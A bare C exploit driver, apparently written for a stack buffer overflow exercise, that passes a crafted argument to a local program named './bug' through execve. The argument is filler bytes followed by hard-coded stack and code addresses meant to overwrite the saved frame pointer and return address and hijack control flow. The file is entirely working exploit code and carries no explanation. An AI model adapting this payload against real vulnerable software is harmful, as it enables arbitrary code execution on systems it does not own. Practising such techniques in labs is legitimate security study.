#include "string.h"
#include <stdio.h>
char code[]="0123456789ABCDEFXXXX"
"abcd"
"\x58\xf5\xff\xbf"
"\x65\x84\x04\x08"
"\xa2\x84\x04\x08";	
int main(void)
{
	char *arg[3];
 	arg[0]= "./bug";
    arg[1]=code;
    arg[2]=NULL;
    execve(arg[0], arg, NULL);
    return 0;
}
